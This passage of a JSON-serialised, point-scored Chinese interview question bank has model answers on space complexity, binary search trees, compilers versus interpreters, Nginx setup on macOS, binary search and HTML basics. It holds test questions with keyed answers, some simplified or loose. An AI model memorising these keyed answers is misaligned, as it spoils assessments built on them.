常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","text":" 常数空间复杂度：算法执行过程中所需的额外空间是固定的，不随输入规模变化。例如，计算两个整数之和的函数，除了输入参数和返回值，没有使用额外的与输入规模相关的空间。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef add_numbers(a, b):\\n    return a + b\\n```","lang":"python","text":"def add_numbers(a, b):\\n    return a + b"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","task":false,"loose":false,"text":"**1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","tokens":[{"type":"text","raw":"**1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","text":"**1：** 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","text":" 线性空间复杂度：算法执行过程中所需的额外空间与输入规模成正比。例如，创建一个长度为 n 的数组来存储数据，其空间复杂度为 O (n)。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef create_array(n):\\n    return [0] * n\\n```","lang":"python","text":"def create_array(n):\\n    return [0] * n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","task":false,"loose":false,"text":"**1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","tokens":[{"type":"text","raw":"**1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","text":"**1：** 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","text":" 平方空间复杂度：常见于创建二维数组等情况，例如创建一个 n×n 的二维数组，其空间复杂度为 O (n²)。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```python\\ndef create_2d_array(n):\\n    return [[0] * n for _ in range(n)]\\n```","lang":"python","text":"def create_2d_array(n):\\n    return [[0] * n for _ in range(n)]"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 什么是二叉搜索树（BST）\\n\\n","depth":2,"text":"什么是二叉搜索树（BST）","tokens":[{"type":"text","raw":"什么是二叉搜索树（BST）","text":"什么是二叉搜索树（BST）","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","task":false,"loose":false,"text":"**1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","tokens":[{"type":"text","raw":"**1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","text":"**1：** 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","text":" 二叉搜索树是一种二叉树，对于树中的每个节点，其左子树的所有节点值都小于该节点值，右子树的所有节点值都大于该节点值。这种特性使得在二叉搜索树上进行查\\n找、插入和删除操作的平均时间复杂度为 O (log n)，n 为节点数。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 简述编译器和解释器的区别\\n\\n","depth":2,"text":"简述编译器和解释器的区别","tokens":[{"type":"text","raw":"简述编译器和解释器的区别","text":"简述编译器和解释器的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","task":false,"loose":false,"text":"**1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","tokens":[{"type":"text","raw":"**1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n\\n目标程序，如 Python 语言默认通过解释器运行代码。","text":"**1：** 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","text":" 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成\\n目标程序，如 Python 语言默认通过解释器运行代码。","escaped":false}]}]}]}]},{"key":"计算机系统","content":"<h1>计算机系统 Mac</h1>\\n<h2>Mac 安装 Nginx</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<pre><code class=\\"language-shell\\"># 基于 brew 安装 Nginx\\n\\n# 安装 Nginx\\nbrew install nginx\\n</code></pre>\\n<p><img src=\\"/public/images/4_Nginx_20241231111116.png\\" alt=\\"\\"></p>\\n<p><a href=\\"https://juejin.cn/post/6883018403641032712\\">常用指令</a></p>\\n<pre><code class=\\"language-shell\\">\\n# 查看配置信息\\nbrew info nginx\\n\\n# 查看 Nginx 配置文件内容\\ncat /opt/homebrew/etc/nginx/nginx.conf\\n\\n# 查看 Nginx 进程\\nps -ef | grep nginx\\n\\n# 查看 Nginx 进程数\\nps -ef | grep nginx | wc -l\\n\\n# 查看 Nginx 进程 ID\\nps -ef | grep nginx | awk &#39;{print $2}&#39;\\n\\n# 查看 Nginx 进程 ID 的个数\\nps -ef | grep nginx | awk &#39;{print $2}&#39; | wc -l\\n</code></pre>\\n<p><img src=\\"/public/images/4_Nginx_20241231113535.png\\" alt=\\"\\"></p>\\n<pre><code class=\\"language-shell\\"># 启动 Nginx\\nbrew services start nginx\\n\\n# 打开界面时，记得查看端口是否被占用\\n# 重启 Nginx\\nbrew services restart nginx\\n\\n# 停止 Nginx\\nbrew services stop nginx\\n\\n# 取消进程\\nsudo kill 进程 ID\\n</code></pre>\\n</details>","ast":[{"type":"heading","raw":"# 计算机系统 Mac\\n\\n","depth":1,"text":"计算机系统 Mac","tokens":[{"type":"text","raw":"计算机系统 Mac","text":"计算机系统 Mac","escaped":false}]},{"type":"heading","raw":"## Mac 安装 Nginx\\n\\n","depth":2,"text":"Mac 安装 Nginx","tokens":[{"type":"text","raw":"Mac 安装 Nginx","text":"Mac 安装 Nginx","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"code","raw":"```shell\\n# 基于 brew 安装 Nginx\\n\\n# 安装 Nginx\\nbrew install nginx\\n```","lang":"shell","text":"# 基于 brew 安装 Nginx\\n\\n# 安装 Nginx\\nbrew install nginx"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/4_Nginx_20241231111116.png)","text":"![](/public/images/4_Nginx_20241231111116.png)","tokens":[{"type":"image","raw":"![](/public/images/4_Nginx_20241231111116.png)","href":"/public/images/4_Nginx_20241231111116.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"[常用指令](https://juejin.cn/post/6883018403641032712)","text":"[常用指令](https://juejin.cn/post/6883018403641032712)","tokens":[{"type":"link","raw":"[常用指令](https://juejin.cn/post/6883018403641032712)","href":"https://juejin.cn/post/6883018403641032712","title":null,"text":"常用指令","tokens":[{"type":"text","raw":"常用指令","text":"常用指令","escaped":false}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```shell\\n\\n# 查看配置信息\\nbrew info nginx\\n\\n# 查看 Nginx 配置文件内容\\ncat /opt/homebrew/etc/nginx/nginx.conf\\n\\n# 查看 Nginx 进程\\nps -ef | grep nginx\\n\\n# 查看 Nginx 进程数\\nps -ef | grep nginx | wc -l\\n\\n# 查看 Nginx 进程 ID\\nps -ef | grep nginx | awk \'{print $2}\'\\n\\n# 查看 Nginx 进程 ID 的个数\\nps -ef | grep nginx | awk \'{print $2}\' | wc -l\\n\\n```","lang":"shell","text":"\\n# 查看配置信息\\nbrew info nginx\\n\\n# 查看 Nginx 配置文件内容\\ncat /opt/homebrew/etc/nginx/nginx.conf\\n\\n# 查看 Nginx 进程\\nps -ef | grep nginx\\n\\n# 查看 Nginx 进程数\\nps -ef | grep nginx | wc -l\\n\\n# 查看 Nginx 进程 ID\\nps -ef | grep nginx | awk \'{print $2}\'\\n\\n# 查看 Nginx 进程 ID 的个数\\nps -ef | grep nginx | awk \'{print $2}\' | wc -l\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/4_Nginx_20241231113535.png)","text":"![](/public/images/4_Nginx_20241231113535.png)","tokens":[{"type":"image","raw":"![](/public/images/4_Nginx_20241231113535.png)","href":"/public/images/4_Nginx_20241231113535.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```shell\\n# 启动 Nginx\\nbrew services start nginx\\n\\n# 打开界面时，记得查看端口是否被占用\\n# 重启 Nginx\\nbrew services restart nginx\\n\\n# 停止 Nginx\\nbrew services stop nginx\\n\\n# 取消进程\\nsudo kill 进程 ID\\n```","lang":"shell","text":"# 启动 Nginx\\nbrew services start nginx\\n\\n# 打开界面时，记得查看端口是否被占用\\n# 重启 Nginx\\nbrew services restart nginx\\n\\n# 停止 Nginx\\nbrew services stop nginx\\n\\n# 取消进程\\nsudo kill 进程 ID"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]},{"key":"算法","content":"<h1>算法</h1>\\n<h2>二分查找</h2>\\n<h4>类型：<code>编程</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 适用条件： 数组必须是有序的。</li>\\n<li><strong>1：</strong> 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。</li>\\n<li><strong>1：</strong> 时间复杂度： O(log n)。</li>\\n<li><strong>1：</strong> 思路：<ul>\\n<li>每次取中间元素与目标值比较。</li>\\n<li>若中间值大于目标值，目标值一定在左半部分。</li>\\n<li>若中间值小于目标值，目标值一定在右半部分。</li>\\n<li>重复上述步骤直到找到目标值或数组为空。</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">function binarySearch(arr, target) {\\n  let left = 0, right = arr.length - 1;\\n  while (left &lt;= right) {\\n    const mid = Math.floor((left + right) / 2);\\n    if (arr[mid] === target) {\\n        return mid;\\n    } else if (arr[mid] &lt; target) {\\n        left = mid + 1;\\n    } else {\\n        right = mid - 1;\\n    }\\n  }\\n  return -1; // 未找到目标值\\n}\\n</code></pre>\\n","ast":[{"type":"heading","raw":"# 算法\\n\\n","depth":1,"text":"算法","tokens":[{"type":"text","raw":"算法","text":"算法","escaped":false}]},{"type":"heading","raw":"## 二分查找\\n\\n","depth":2,"text":"二分查找","tokens":[{"type":"text","raw":"二分查找","text":"二分查找","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 适用条件： 数组必须是有序的。\\n- **1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。\\n- **1：** 时间复杂度： O(log n)。\\n- **1：** 思路：\\n  + 每次取中间元素与目标值比较。\\n  + 若中间值大于目标值，目标值一定在左半部分。\\n  + 若中间值小于目标值，目标值一定在右半部分。\\n  + 重复上述步骤直到找到目标值或数组为空。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 适用条件： 数组必须是有序的。\\n","task":false,"loose":false,"text":"**1：** 适用条件： 数组必须是有序的。","tokens":[{"type":"text","raw":"**1：** 适用条件： 数组必须是有序的。","text":"**1：** 适用条件： 数组必须是有序的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 适用条件： 数组必须是有序的。","text":" 适用条件： 数组必须是有序的。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。\\n","task":false,"loose":false,"text":"**1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","tokens":[{"type":"text","raw":"**1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","text":"**1：** 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","text":" 应用场景： 查找有序数组中的元素，例如数据查询、搜索问题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 时间复杂度： O(log n)。\\n","task":false,"loose":false,"text":"**1：** 时间复杂度： O(log n)。","tokens":[{"type":"text","raw":"**1：** 时间复杂度： O(log n)。","text":"**1：** 时间复杂度： O(log n)。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 时间复杂度： O(log n)。","text":" 时间复杂度： O(log n)。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 思路：\\n  + 每次取中间元素与目标值比较。\\n  + 若中间值大于目标值，目标值一定在左半部分。\\n  + 若中间值小于目标值，目标值一定在右半部分。\\n  + 重复上述步骤直到找到目标值或数组为空。","task":false,"loose":false,"text":"**1：** 思路：\\n+ 每次取中间元素与目标值比较。\\n+ 若中间值大于目标值，目标值一定在左半部分。\\n+ 若中间值小于目标值，目标值一定在右半部分。\\n+ 重复上述步骤直到找到目标值或数组为空。","tokens":[{"type":"text","raw":"**1：** 思路：\\n","text":"**1：** 思路：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 思路：","text":" 思路：","escaped":false}]},{"type":"list","raw":"+ 每次取中间元素与目标值比较。\\n+ 若中间值大于目标值，目标值一定在左半部分。\\n+ 若中间值小于目标值，目标值一定在右半部分。\\n+ 重复上述步骤直到找到目标值或数组为空。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 每次取中间元素与目标值比较。\\n","task":false,"loose":false,"text":"每次取中间元素与目标值比较。","tokens":[{"type":"text","raw":"每次取中间元素与目标值比较。","text":"每次取中间元素与目标值比较。","tokens":[{"type":"text","raw":"每次取中间元素与目标值比较。","text":"每次取中间元素与目标值比较。","escaped":false}]}]},{"type":"list_item","raw":"+ 若中间值大于目标值，目标值一定在左半部分。\\n","task":false,"loose":false,"text":"若中间值大于目标值，目标值一定在左半部分。","tokens":[{"type":"text","raw":"若中间值大于目标值，目标值一定在左半部分。","text":"若中间值大于目标值，目标值一定在左半部分。","tokens":[{"type":"text","raw":"若中间值大于目标值，目标值一定在左半部分。","text":"若中间值大于目标值，目标值一定在左半部分。","escaped":false}]}]},{"type":"list_item","raw":"+ 若中间值小于目标值，目标值一定在右半部分。\\n","task":false,"loose":false,"text":"若中间值小于目标值，目标值一定在右半部分。","tokens":[{"type":"text","raw":"若中间值小于目标值，目标值一定在右半部分。","text":"若中间值小于目标值，目标值一定在右半部分。","tokens":[{"type":"text","raw":"若中间值小于目标值，目标值一定在右半部分。","text":"若中间值小于目标值，目标值一定在右半部分。","escaped":false}]}]},{"type":"list_item","raw":"+ 重复上述步骤直到找到目标值或数组为空。","task":false,"loose":false,"text":"重复上述步骤直到找到目标值或数组为空。","tokens":[{"type":"text","raw":"重复上述步骤直到找到目标值或数组为空。","text":"重复上述步骤直到找到目标值或数组为空。","tokens":[{"type":"text","raw":"重复上述步骤直到找到目标值或数组为空。","text":"重复上述步骤直到找到目标值或数组为空。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nfunction binarySearch(arr, target) {\\n  let left = 0, right = arr.length - 1;\\n  while (left <= right) {\\n    const mid = Math.floor((left + right) / 2);\\n    if (arr[mid] === target) {\\n        return mid;\\n    } else if (arr[mid] < target) {\\n        left = mid + 1;\\n    } else {\\n        right = mid - 1;\\n    }\\n  }\\n  return -1; // 未找到目标值\\n}\\n\\n```\\n","lang":"javascript","text":"function binarySearch(arr, target) {\\n  let left = 0, right = arr.length - 1;\\n  while (left <= right) {\\n    const mid = Math.floor((left + right) / 2);\\n    if (arr[mid] === target) {\\n        return mid;\\n    } else if (arr[mid] < target) {\\n        left = mid + 1;\\n    } else {\\n        right = mid - 1;\\n    }\\n  }\\n  return -1; // 未找到目标值\\n}\\n"}]},{"key":"HTML","content":"<h1>HTML</h1>\\n<h2>什么是静态网页？什么是动态网页？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页</li>\\n</ul>\\n<h2>谈谈你对 HTML 语义化的理解</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> What：通过语义化标签对网站进行结构化；</li>\\n<li><strong>1：</strong> Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；</li>\\n<li><strong>1：</strong> How：<code>header</code>-文档头、<code>nav</code>-导航区、<code>section</code>-文档块、<code>article</code>-内容、<code>aside</code>-侧边栏-广告栏、<code>footer</code>-文档脚注；</li>\\n</ul>\\n<h2>谈谈你对锚点的理解</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> What &amp; Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；</li>\\n<li><strong>1：</strong> How：<code>&lt;h2 id=&quot;know&quot;&gt;谈谈你对锚点的理解 &lt;a href=&quot;#know&quot;&gt;​&lt;/a&gt;&lt;/h2&gt;</code>、<code>&lt;div&gt;&lt;a name=&quot;know&quot;&gt;​&lt;/a&gt;&lt;a href=&quot;#know&quot;&gt;​&lt;/a&gt;&lt;/div&gt;</code>、``；</li>\\n</ul>\\n<h2>超链接有哪些常见的表现形式？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong><ul>\\n<li>跳转链接：页面跳转，<code>&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;</code></li>\\n<li>下载链接：下载资源，<code>&lt;a href=&quot;data.zip&quot;&gt;本地&lt;/a&gt;</code></li>\\n<li>锚点链接：锚点跳转，<code>&lt;a href=&quot;#know&quot;&gt;​&lt;/a&gt;</code></li>\\n<li>邮箱链接：唤起邮箱，<code>&lt;a href=&quot;mailto:xxx@xxx.com&quot;&gt;xxx&lt;/a&gt;</code></li>\\n<li>空链接：返回页面顶部，<code>&lt;a href=&quot;&quot;&gt;​&lt;/a&gt;</code></li>\\n<li>代码块：执行代码，<code>&lt;a href=&quot;javascript:void(0);&quot;&gt;​&lt;/a&gt;</code></li>\\n</ul>\\n</li>\\n</ul>\\n<h2>img 标签的 title 和 alt 属性作用</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> <code>title</code>属性是当鼠标悬停在图片上时，显示的提示文本；<code>alt</code>属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。</li>\\n</ul>\\n<h2>src 与 href 的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> <code>src</code>属性是资源路径，引入资源，属于当前页不可缺少的部分，如：<code>src=&quot;http://www.baidu.com/logo.png&quot;</code>；<code>href</code>属性是超链接，引用资源，表示该资源与当前页有关联，如：<code>href=&quot;http://www.baidu.com&quot;</code>。</li>\\n</ul>\\n<h2>iframe 有哪些特点（优缺点）？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 优点：<ul>\\n<li>内容独立：iframe 中的元素、变量、样式是独立的；</li>\\n<li>并行加载：浏览器可以同时加载一个页面中多个 iframe 